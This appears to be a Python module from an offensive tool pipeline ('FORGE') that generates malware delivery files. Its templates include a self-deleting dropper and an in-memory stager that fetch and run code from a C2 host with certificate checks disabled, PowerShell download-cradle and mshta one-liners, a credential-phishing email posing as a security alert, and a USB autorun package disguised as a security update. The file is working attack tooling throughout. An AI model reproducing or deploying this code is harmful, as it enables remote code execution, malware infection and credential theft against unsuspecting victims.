"""Payload Delivery Generator — dropper, stager, phishing, USB.

Generates delivery mechanisms for getting tools to targets:
dropper, stager, PowerShell one-liner, phishing template, USB autorun.

Usage:
    from core.payload_delivery import PayloadDeliveryGenerator
    pdg = PayloadDeliveryGenerator()
    files = pdg.generate(intent_str, tool_name, code, config, task_dir)
"""
# Dependencies: pathlib
# Depended by: forge_live.py pipeline (step 9)

from pathlib import Path


class PayloadDeliveryGenerator:
    """
    Generates delivery mechanisms for getting the tool to the target.
    Dropper, stager, phishing template, USB autorun package.
    """

    def generate(self, intent_str, tool_name, code, config=None, task_dir=None):
        """Generate delivery mechanisms. Returns dict of delivery files."""
        config = config or {}
        il = intent_str.lower()
        deliveries = {}

        c2_host = config.get("server_ip", config.get("lhost", config.get("c2_server",
                    config.get("target", "C2_HOST"))))
        c2_port = config.get("server_port", config.get("lport", config.get("c2_port",
                    config.get("port", "443"))))

        # ── 1. Dropper (download + execute) ─────────────────────────────────
        deliveries["dropper.py"] = f'''#!/usr/bin/env python3
"""FORGE Dropper — Downloads and executes payload from staging server."""
import urllib.request, tempfile, subprocess, os, sys, ssl

STAGE_URL = "https://{c2_host}:{c2_port}/cdn/assets/main.js"
EXEC_NAME = "{tool_name}"

def main():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    tmp = tempfile.mkdtemp(prefix=".")
    payload_path = os.path.join(tmp, EXEC_NAME + ".py")

    try:
        req = urllib.request.Request(STAGE_URL, headers={{
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/javascript",
        }})
        with urllib.request.urlopen(req, context=ctx) as resp:
            data = resp.read()

        # Decode if base64-wrapped in JSON
        if data.startswith(b'{{"status"'):
            import json, base64
            j = json.loads(data)
            data = base64.urlsafe_b64decode(j.get("data", ""))

        with open(payload_path, "wb") as f:
            f.write(data)

        os.chmod(payload_path, 0o700)
        subprocess.Popen([sys.executable, payload_path],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         start_new_session=True)
    except Exception:
        pass
    finally:
        # Self-delete dropper
        try:
            os.unlink(__file__)
        except OSError:
            pass

if __name__ == "__main__":
    main()
'''

        # ── 2. Stager (minimal footprint, in-memory exec) ──────────────────
        deliveries["stager.py"] = f'''#!/usr/bin/env python3
"""FORGE Stager — Minimal footprint, in-memory payload execution."""
import urllib.request, ssl, base64

U = "https://{c2_host}:{c2_port}/api/v1/status"

def s():
    c = ssl.create_default_context()
    c.check_hostname = False
    c.verify_mode = ssl.CERT_NONE
    r = urllib.request.Request(U, headers={{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Cookie": "session=c3RhZ2Vy"}})
    with urllib.request.urlopen(r, context=c) as p:
        d = p.read()
    try:
        import json
        j = json.loads(d)
        d = base64.urlsafe_b64decode(j.get("data", ""))
    except Exception:
        pass
    exec(compile(d, "<stage>", "exec"), {{"__name__": "__main__"}})

if __name__ == "__main__":
    s()
'''

        # ── 3. PowerShell One-Liner (Windows targets) ──────────────────────
        ps_oneliner = f'powershell -nop -w hidden -enc ' + \
            'BASE64_ENCODED_COMMAND'  # Placeholder — actual encoding at deploy time
        deliveries["delivery_powershell.txt"] = f'''# FORGE Payload Delivery — PowerShell
# For Windows targets. Encode the stager and execute in memory.

# Option 1: Download cradle (modify URL to staging server)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('https://{c2_host}:{c2_port}/cdn/assets/main.js')"

# Option 2: Encoded command (paste stager.py content, base64 encode)
# python3 -c "import base64; print(base64.b64encode(open('stager.py','rb').read()).decode())"
# Then: powershell -nop -w hidden -enc <BASE64_OUTPUT>

# Option 3: HTA delivery (for phishing)
# mshta https://{c2_host}:{c2_port}/static/health
'''

        # ── 4. Phishing Email Template ──────────────────────────────────────
        if any(k in il for k in ("phish", "credential", "harvest", "social")):
            deliveries["phishing_template.html"] = f'''<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Security Update Required</title></head>
<body style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; max-width: 600px; margin: 0 auto; padding: 20px;">
<div style="background: #f8f9fa; border-radius: 8px; padding: 30px; border-left: 4px solid #0066cc;">
    <h2 style="color: #1a1a1a; margin-top: 0;">Action Required: Security Verification</h2>
    <p style="color: #4a4a4a; line-height: 1.6;">
        Our security team has detected unusual activity on your account.
        To maintain access, please verify your credentials within the next 24 hours.
    </p>
    <a href="https://{c2_host}:{c2_port}/verify"
       style="display: inline-block; background: #0066cc; color: white; padding: 12px 24px;
              text-decoration: none; border-radius: 4px; font-weight: 600;">
        Verify Now
    </a>
    <p style="color: #888; font-size: 12px; margin-top: 20px;">
        This is an automated security notification. Do not reply to this email.<br>
        If you did not request this verification, please contact IT support immediately.
    </p>
</div>
</body>
</html>'''

        # ── 5. USB Drop Package ─────────────────────────────────────────────
        deliveries["usb_autorun.inf"] = f'''[AutoRun]
open=launch.bat
icon=icon.ico,0
label=Security Update
action=Install Security Update

[Content]
MUIVerb=Security Update
'''
        deliveries["usb_launch.bat"] = f'''@echo off
title Security Update - Please Wait
echo Installing security update...
start /min pythonw stager.py
echo Update complete.
timeout /t 3 >nul
'''

        # Write all delivery files
        if task_dir:
            delivery_dir = task_dir / "delivery"
            delivery_dir.mkdir(exist_ok=True)
            for filename, content in deliveries.items():
                (delivery_dir / filename).write_text(content)

        return list(deliveries.keys())


